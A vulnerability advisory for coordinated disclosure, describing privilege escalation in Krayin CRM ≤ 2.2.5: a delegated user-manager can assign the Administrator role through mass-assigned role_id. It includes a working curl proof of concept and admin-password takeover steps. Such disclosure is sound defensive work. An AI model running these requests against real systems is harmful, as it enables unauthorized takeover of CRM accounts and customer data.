# Privilege Escalation via Unrestricted Role Assignment in User Management (Krayin CRM ≤ 2.2.5)

## Summary
`UserController::update()` (and `store()`) assign the `role_id` from client-supplied input and validate only that the role **exists** — never that the acting user is authorized to grant that role. Combined with mass assignment (`request()->all()`) and the absence of any role-hierarchy or ownership check, **any account that holds a delegated user-management permission can elevate itself, or any other account, to the full Administrator role (`permission_type = all`), obtaining complete super-administrator access.**

## Severity
**High** — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (**8.8**)

Vertical privilege escalation from a low-privileged, delegated role to super-administrator.

## Affected Versions
- Confirmed on **2.2.4** and **2.2.5** (latest at time of writing).
- The vulnerable code in `UserController::update()`/`store()` is **byte-for-byte identical** between 2.2.4 and 2.2.5, so all releases up to and including **2.2.5** are affected.

## Affected Component
- Controller: `Webkul\Admin\Http\Controllers\Settings\UserController`
- Methods: `store()`, `update()`
- Endpoints:
  - `POST /admin/settings/users/create`
  - `PUT  /admin/settings/users/edit/{id}`

## Description
`update()` validates the request as follows:

```php
$this->validate(request(), [
    'email'    => 'required|email|unique:users,email,'.$id,
    'name'     => 'required|string',
    'password' => 'nullable|string|min:6',
    'role_id'  => 'required|integer|exists:roles,id',   // <-- only checks existence
    'status'   => 'nullable|boolean|in:0,1',
    ...
]);

$data = request()->all();          // <-- mass assignment
...
$admin = $this->userRepository->update($data, $id);
```

Two independent problems combine:

1. **No privilege/hierarchy check on `role_id`.** The rule `exists:roles,id` only confirms the role exists. A user is never prevented from assigning a role more privileged than their own (e.g. the built-in `Administrator` role, `id = 1`, `permission_type = all`).
2. **Mass assignment.** `role_id` is in the `User` model's `$fillable`, and the controller passes the entire request into `update()`/`create()`, so the attacker fully controls it.

`update()` also performs **no ownership or hierarchy validation**, so a user with the user-edit permission may modify **any** account — including their own and the primary super-admin account (`id = 1`).

## Preconditions
The acting account must hold a user-management permission (`settings.user.users.edit` or `settings.user.users.create`) through a **custom, non-administrator role**. This is a legitimate delegated permission (e.g. an "HR" or "team-lead" role that manages staff accounts) that must **not**, by itself, grant the ability to hand out full administrative privileges.

## Proof of Concept
As a user whose role has only user-management permissions (not Administrator):

```bash
BASE=https://TARGET
CJ=$(mktemp)

# 1) authenticate as the delegated (non-admin) user
LT=$(curl -s -c "$CJ" "$BASE/admin/login" | grep -oE 'name="_token" value="[^"]+"' | sed -E 's/.*value="([^"]+)".*/\1/')
curl -s -b "$CJ" -c "$CJ" -o /dev/null -X POST "$BASE/admin/login" \
  --data-urlencode "_token=$LT" --data-urlencode "email=usermgr@example.com" --data-urlencode "password=SomePass1!"
XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\s+(\S+)',open('$CJ').read()).group(1)))")

# 2) elevate own account (id 8 here) to the Administrator role (id 1)
curl -s -b "$CJ" -X PUT "$BASE/admin/settings/users/edit/8" \
  -H "X-XSRF-TOKEN: $XSRF" -H "Accept: application/json" \
  --data-urlencode "name=usermgr" \
  --data-urlencode "email=usermgr@example.com" \
  --data-urlencode "role_id=1" \
  --data-urlencode "view_permission=global"
```

**Observed result:** the endpoint returns `HTTP 200` with `"role_id":"1"` and message `User updated successfully.`. Before the request, the account is denied administrative pages (e.g. `GET /admin/settings/roles` returns the 401/unauthorized view); after re-authenticating, the same pages are fully accessible — the account is now a super-administrator (`permission_type = all`).

The same request also enables:
- **Promoting any account** to Administrator (change `edit/{id}` to the victim's id).
- **Creating a new Administrator** via `POST /admin/settings/users/create` with `role_id=1`.
- **Taking over the primary super-admin (`id = 1`)** by resetting its password through `PUT /admin/settings/users/edit/1` with `password`/`confirm_password` — no current-password check.

## Impact
Full vertical privilege escalation from a delegated user-management role to super-administrator, leading to complete compromise of the CRM: all users, all settings, and all stored customer data, plus the ability to hijack the primary administrator account.

## Suggested Remediation
- Reject assignment of any role whose privileges exceed the acting user's own; restrict granting of `Administrator`/`permission_type = all` roles to full administrators.
- Enforce ownership and role-hierarchy checks in `update()`; protect the primary administrator account (`id = 1`) from modification by non-administrators.
- Replace `request()->all()` with an explicitly validated whitelist (e.g. `$request->safe()->only([...])`); do not keep privilege-bearing fields such as `role_id` blindly mass-assignable.
- Require re-authentication (current password) for password changes on other accounts.

## Disclosure
Reported privately under coordinated disclosure. PoC and version evidence (reproduced on a clean 2.2.5 install) available on request. Please credit the reporter and, if applicable, request a CVE ID for this issue.